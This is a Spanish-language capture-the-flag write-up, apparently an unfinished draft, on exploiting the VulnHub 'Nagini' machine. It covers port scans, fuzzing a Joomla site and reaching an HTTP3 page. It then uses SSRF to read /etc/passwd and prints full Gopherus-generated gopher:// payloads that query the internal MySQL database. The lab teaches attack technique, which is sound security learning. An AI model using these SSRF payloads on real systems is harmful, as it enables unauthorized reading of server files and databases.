---
layout: single
title: Nagini - VulnHub
excerpt: "."
date: 2024-11-11
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-nagini/.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - VulnHub
  - Medium Machine
tags:
  - Linux
  - CMS Joomla
  - HTTP3 Quic
  - Web Recognition
---
![](/assets/images/vulnhub-writeup-nagini/.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#fuzz">Fuzzing</a></li>
				<li><a href="#"></a></li>
                                <li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.006
PING 192.168.1.006 (192.168.1.006) 56(84) bytes of data.
64 bytes from 192.168.1.006: icmp_seq=1 ttl=64 time=2.19 ms
64 bytes from 192.168.1.006: icmp_seq=2 ttl=64 time=1.35 ms
64 bytes from 192.168.1.006: icmp_seq=3 ttl=64 time=0.850 ms
64 bytes from 192.168.1.006: icmp_seq=4 ttl=64 time=0.822 ms

--- 192.168.1.006 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3362ms
rtt min/avg/max/mdev = 0.822/1.302/2.187/0.552 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.006 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 16:15 CST
Initiating ARP Ping Scan at 16:15
Scanning 192.168.1.006 [1 port]
Completed ARP Ping Scan at 16:15, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:15
Scanning 192.168.1.006 [65535 ports]
Discovered open port 80/tcp on 192.168.1.006
Discovered open port 22/tcp on 192.168.1.006
Completed SYN Stealth Scan at 16:16, 62.67s elapsed (65535 total ports)
Nmap scan report for 192.168.1.006
Host is up, received arp-response (0.040s latency).
Scanned at 2024-11-11 16:15:25 CST for 63s
Not shown: 53010 filtered tcp ports (no-response), 12523 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:F1:5C:11 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds
           Raw packets sent: 124833 (5.493MB) | Rcvd: 12577 (512.610KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solamente hay dos puertos abiertos, y por lo que se ve, toda la intrusión será por la página web.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80 192.168.1.006 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 16:18 CST
Nmap scan report for 192.168.1.006
Host is up (0.0016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:F1:5C:11 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

En efecto, la intrusión será por web, así que vamos a analizarla.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura1.png">
</p>

Solo vemos una imagen, es como en la **máquina Aragog**.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura2.png">
</p>

No nos dice mucho.

No creo que podamos ver algo por aquí, entonces, vamos a aplicar **Fuzzing**:

<h2 id="fuzz">Fuzzing</h2>

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.006/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.006/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000006201:   301        9 L      28 W       319 Ch      "joomla"                       
000045226:   200        5 L      11 W       97 Ch       "http://192.168.1.006/"               
000095510:   403        9 L      28 W       280 Ch      "server-status"                                

Total time: 0
Processed Requests: 220545
Filtered Requests: 220542
Requests/sec.: 0
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

<br>

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.006/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.006/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/joomla               (Status: 301) [Size: 319] [--> http://192.168.1.006/joomla/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Parece que esta ocupando el **servicio Joomla** y que yo recuerde, es la primera vez que me enfrento a este servicio.

Investiguemos de que trata este servicio:

| **Servicio Joomla** |
|:-----------:|
| *Joomla es la herramienta líder en la creación de webs, es el Gestor de Contenidos (CMS en inglés) más premiado a nivel mundial, existen más de 40 millones de páginas web creadas con Joomla y tienes a tu disposición más de 12.000 componentes que te permitirán ir ampliando las funcionalidades de tu web con nuevas opciones como pueden ser tienda virtual, envío de boletines, foros, galerías de imágenes y un sinfín de posibilidades que no paran de crecer.* |

<br>

Si lo visitamos, encontramos lo siguiente:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura3.png">
</p>

Y podemos ver que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura4.png">
</p>

Son muchas tecnologías, y veo que usa **PHP**, lo que nos puede ayudar bastante para la intrusión.

Veamos que podemos encontrar aplicando **Fuzzing** al **servicio Joomla**:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.006/joomla/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.006/joomla/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000131:   301        9 L      28 W       327 Ch      "modules"      
000000002:   301        9 L      28 W       326 Ch      "images"          
000001235:   301        9 L      28 W       329 Ch      "libraries"     
000001069:   301        9 L      28 W       325 Ch      "cache"              
000000856:   301        9 L      28 W       328 Ch      "language"           
000003533:   301        9 L      28 W       327 Ch      "layouts"                
000003223:   301        9 L      28 W       323 Ch      "tmp"                    
000005675:   301        9 L      28 W       333 Ch      "administrator"      
000000991:   301        9 L      28 W       330 Ch      "components"              
000000624:   301        9 L      28 W       328 Ch      "includes"                 
000000469:   301        9 L      28 W       323 Ch      "bin"                  
000000067:   301        9 L      28 W       329 Ch      "templates"         
000000066:   301        9 L      28 W       325 Ch      "media"                
000000505:   301        9 L      28 W       327 Ch      "plugins"         
000020670:   301        9 L      28 W       323 Ch      "cli"                  
000045226:   200        160 L    428 W      6640 Ch     "http://192.168.1.006/joomla/"  

Total time: 0
Processed Requests: 220545
Filtered Requests: 220529
Requests/sec.: 0
```

Con **gobuster** encontramos lo mismo.

Son varias cosiilas, pero en todas no podremos ver nada.

Quizá pasamos por alto algo en la página principal. Regresemos y veamos si no hay algún archivo **txt o PHP o HTML** que no hayamos visto:

```bash
gobuster dir -u http://192.168.1.006/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.006/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 97]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 319] [--> http://192.168.100.214/joomla/]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

Observamos uno, vayamos a verlo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura9.png">
</p>

Parece que tenemos un dominio y que están usando **HTTP3** para almacenarlo y mostrarlo.

Agrega el dominio al `/etc/hosts` e investiguemos eso del **HTTP3**.

<h2 id="HTTP3">Utilizando quiche 0.16.0 para Aplicar Peticiones a HTTP3 Quic</h2>

| **Protocolo HTTP3** |
|:-----------:|
| *HTTP/3 es la última versión principal de HTTP. Una diferencia importante en HTTP/3 es que se ejecuta en QUIC, un nuevo protocolo de transporte. QUIC está diseñado para ser rápido y admitir cambios rápidos entre redes. Se basa en el User Datagram Protocol (UDP) en lugar del protocolo de control de transmisión (TCP), que mitiga un problema llamado bloqueo de encabezado de línea en TCP, donde la pérdida o reordenación del paquete de red puede ralentizar las conexiones con un alto volumen de transacciones. Además, QUIC separa la conexión de transporte de la capa 4 del flujo de dirección IP de la capa 3, lo que permite la migración entre diferentes redes sin interrupciones.* |

<br>

Hay varias formas en las que podemos ver una página web que ocupa HTTP3, estas son:
* Actualizar **curl** para que pueda tramitar peticiones **HTTP3**: <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md" target="_blank">Repositorio de curl: HTTP3 Documents</a>
* Utilizar la herramienta **quiche** para realizar las peticiones **HTTP3**: <a href="https://github.com/cloudflare/quiche" target="_blank">Repositorio de cloudfare: quiche</a>

Por lo que he visto, ya no es tan necesario actualizar **curl**, ya que actualmente tiene soporte para poder aplicar peticiones **HTTP2 y HTTP3**. Esto lo puedes comprobar viendo la versión de **curl** que tengas:
```bash
curl --version
curl 8.11.1-DEV (x86_64-pc-linux-gnu) libcurl/8.11.1-DEV quictls/3.1.4 zlib/1.3.1 brotli/1.1.0 zstd/1.5.6 libidn2/2.3.7 libpsl/0.21.2 nghttp2/1.64.0 ngtcp2/1.2.0 nghttp3/1.1.0 librtmp/2.3
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

Entonces, podríamos mandar una petición para ver si podemos ver el contenido del dominio, pero observa lo que obtenemos:
```bash
curl --http3 https://quic.nagini.hogwarts
curl: (56) Failed to connect to quic.nagini.hogwarts port 443 after 4 ms: Failure when receiving data from the peer

curl --http3-only https://quic.nagini.hogwarts
curl: (56) Failed to connect to quic.nagini.hogwarts port 443 after 1 ms: Failure when receiving data from the peer
```

La otra opción sería usar **quiche**, pero tampoco nos va a funcionar.

¿Por que? Pues porque la **máquina Nagini** tiene una versión desactualizada de **HTTP3** siendo que es del 2021, por lo que necesitaremos una versión de **quiche** de esas fechas, ya que si usamos una actual, tendra conflictos para ver el contenido del dominio.

Ocuparemos la **version 0.16.0**, la puedes descargar de los releases:
* <a href="https://github.com/cloudflare/quiche/releases?page=2" target="_blank">Repositorio de cloudfare: quiche ver. 0.16.0</a>

Aun así, ocuparemos la versión actual, ya que hace falta un directorio crucial para poder compilar las herramientas que vamos a ocupar de **quiche**, así que descarga ambos.

Ya descagadas ambas versiones, sigue estos pasos:
* Elimina el **directorio boringssl** de la **versión 0.16.0**, ya que no tiene nada dentro. Se encuentra en la ruta: `quiche/deps/boringssl`:
```bash
# Estoy dentro del directorio quiche-0.16.0
rm -r quiche/deps/boringssl
```

* Copia el **directorio boringssl** de la **versión actual que tengas de quiche** y ponlo en la misma ruta donde lo eliminaste: `quiche/deps`:
```bash
# Estoy dentro del directorio quiche-0.16.0
cp -r ../quiche/quiche/deps/boringssl quiche/deps/.
```

Quizá exista una mejor forma de hacer esto, pero a mi me funcionó.

Con esto listoo, ya puedes aplicar los comandos para armar la herramienta:
```bash
cargo build --examples
cargo test
```

Te saldra uno que otro error, pero lo importante es que se compilo la herramienta que necesitamos. Esta se encuentra dentro del directorio `target/debug/examples` y se llama **http3-client**.

Tan solo tienes que ejecutarla, añadiendole la URL que quieres ver:
```bash
./http3-client https://quic.nagini.hogwarts/
<html>
        <head>
        <title>Information Page</title>
        </head>
        <body>
                Greetings Developers!!

                I am having two announcements that I need to share with you:

                1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
                2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


                Regards,
                site_admin
        </body>
</html>
```

Muy bien, funciono correctamente (tarde 2 dias y medio resolviendo este problema, te odio **HTTP3**).

Nos estan dando una ruta que podemos visitar y lo que parece ser una pista de que debemos buscar **archivos .bak**.

Pero primero visitemos esa ruta que nos mostraron.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="SSRF">Aplicando SSRF en la Ruta Descubierta</h2>

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura5.png">
</p>

Creó que con el mensaje que viene ahí, sabemos lo que podemos hacer.

Probemos a ver la página web de la máquina:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura6.png">
</p>

La podemos ver, entonces tambien deberíamos poder ver la nota que encontramos antes:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura7.png">
</p>

Es posible que esta página sea vulnerable al **ataque SSRF**:

| **Servicio FreePBX** |
|:-----------:|
| *El Server Side Request Forgery (SSRF) ocurre cuando una aplicación web permite hacer consultas HTTP del lado del servidor hacia un dominio arbitrario elegido por el atacante. Esto le permite a un atacante hacer conexión con servicios de la infraestructura interna donde se aloja la web y exfiltrar información sensible.* |

<br>

Podemos apuntar a un archivo local utilizando el esquema `file://`, ya que se puede interpretar como una **URL** y es un tipo de **URL** que señala archivos locales.

Apliquemoslo, apuntando al `/etc/passwd`:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura8.png">
</p>

Funciona.

Podemos ver que hay por lo menos 3 usuarios: snape, ron y hermoine. Además, parece que esta ocupando el **servicio MySQL**.

Al estar funcionando internamenmte, podemos tratar de apuntar a un **archivo PHP** nuestro para que lo interprete la página y si funciona, tendríamos una forma de obtener una **Reverse Shell**.

Probemos:
* Crea un archivo PHP simple, ponle solo texto si lo deseas:
```php
<?php
        echo 'hola papus/mamus del mundo';
?>
```

* Abre un servidor de **Python** y desde la página web, apunta al archivo que creaste:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura11.png">
</p>

Parece que no lo está interpretando.

Probemos con uno de **HTML**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura12.png">
</p>

Este si funciona, pero no nos ayuda mucho que digamos. Entonces, de momento, esto no nos sirve de mucho.

Lo que podemos hacer, es buscar vulnerabilidades que tenga el **CMS Joomla**.

<h2 id="Joomla">Buscando Vulnerabilidades del CMS Joomla con joomscan</h2>

De acuerdo al siguiente blog:
* <a href="https://www.getastra.com/blog/security-audit/joomla-penetration-testing/" target="_blank">Joomla Security Audit & Penetration Testing: Steps & Tools</a>

Podemos ocupar la herramienta **joomscan** para que busque vulnerabilidades en la página web.

Puedes descargalo aquí:
* <a href="https://github.com/OWASP/joomscan" target="_blank">Repositorio de OWASP: joomscan</a>

Sigue las instrucciones e instalalo.

Ya instalado, vamos a indicarle la ruta que ocupa **Joomla** para que empiece a buscar vulnerabilidades:
```bash
perl joomscan.pl -u http://192.168.1.006/joomla
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.1.006/joomla ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.1.006/joomla/administrator/components
http://192.168.1.006/joomla/administrator/modules
http://192.168.1.006/joomla/administrator/templates
http://192.168.1.006/joomla/tmp
http://192.168.1.006/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.1.006/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.1.006/joomla/robots.txt 

Interesting path found from robots.txt
http://192.168.1.006/joomla/joomla/administrator/
http://192.168.1.006/joomla/administrator/                                                                                                                                                                     
http://192.168.1.006/joomla/bin/                                                                                                                                                                               
http://192.168.1.006/joomla/cache/                                                                                                                                                                             
http://192.168.1.006/joomla/cli/                                                                                                                                                                               
http://192.168.1.006/joomla/components/                                                                                                                                                                        
http://192.168.1.006/joomla/includes/                                                                                                                                                                          
http://192.168.1.006/joomla/installation/                                                                                                                                                                      
http://192.168.1.006/joomla/language/                                                                                                                                                                          
http://192.168.1.006/joomla/layouts/                                                                                                                                                                           
http://192.168.1.006/joomla/libraries/                                                                                                                                                                         
http://192.168.1.006/joomla/logs/                                                                                                                                                                              
http://192.168.1.006/joomla/modules/                                                                                                                                                                           
http://192.168.1.006/joomla/plugins/                                                                                                                                                                           
http://192.168.1.006/joomla/tmp/                                                                                                                                                                               
                                                                                                                                                                                                                                            
[+] Finding common backup files name                                                                                                                                                                             
[++] Backup files are not found                                                                                                                                                                                  
                                                                                                                                                                                                                 
[+] Finding common log files name                                                                                                                                                                                
[++] error log is not found                                                                                                                                                                                      
                                                                                                                                                                                                                 
[+] Checking sensitive config.php.x file                                                                                                                                                                         
[++] Readable config file is found                                                                                                                                                                               
 config file path : http://192.168.100.217/joomla/configuration.php.bak                                                                                                                                          
                                                                                                                                                                                                                 
Your Report : reports/192.168.100.217/
```
Excelente, parece que encontro un **archivo .bak** que justamente advirtieron no ponerlo en producción.

Vamos a verlo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura10.png">
</p>

Se descargo automaticamente.

Mandalo a tu directorio de trabajo y analizalo:
```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
...
...
...
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
...
...
...
	public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
...
...
...
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

No viene mucho, a excepción de un usuario y contraseña para la base de datos de **MySQL** que están ocupando.

Aun así, no podemos hacer nada de momento.

<h2 id="">Utilizando ataque SSRF y Gopherus para Enumerar Base de Datos de MySQL</h2>

Buscando por la biblia **HackTricks**, nos dice que podemos usar **Gopherus** para crear payloads aplicables a MySQL, PostgreSQL, FastCGI, etc:
* <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#tools" target="_blank">HackTricks: SSRF - Tools</a>

Podemos visitar el blog del creado de **Gopherus** y ahí viene el link para ir al GitHub de la herramienta.

Igual te lo pongo aquí para que lo descargues:
* <a href="https://github.com/tarunkant/Gopherus" target="_blank">Repositorio de tarunkant: Gopherus</a>

Instalala y ejecutala:
```bash
gopherus

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
usage: gopherus [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
None
```

El mismo **GitHub** nos lo dice, si llegamos a encontrar una página vulnerable al **ataque SSRF**, que además sabemos que ocupa el **servicio MySQL**, entonces, podemos usar **Gopherus** para crear payloads y obtener un **RCE**.

Usemos la herramienta para que nos cree un payload para **MySQL** y veamos que obtenemos al usarlo en la página vulnerable:

Al usar la herramienta, nos pedira un usuario que no tenga una contraseña, este ya lo tenemos gracias al **archivo .bak** y luego nos pide la query que queremos usar. Usaremos la query `show databases;`, para ver todas las bases de datos almacenadas:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: show databases;

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
```

Copia y pega ese payload en la página vulnerable y cargalo varias veces para funcione:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura13.png">
</p>

Bien, tenemos la BD llamada **joomla**. Usemos la query `use joomla; show tables;`, para ver las tablas de esa BD:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: use joomla; show tables;

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
```

Lo mismo, copia y pega ese payload en la página vulnerable y cargalo varias veces para funcione:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura14.png">
</p>

Al final, esta una tabla llamada **joomla_users**. Hagamos el mismo procedimiendo, usemos la query `use joomla; select * from joomla_users`:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
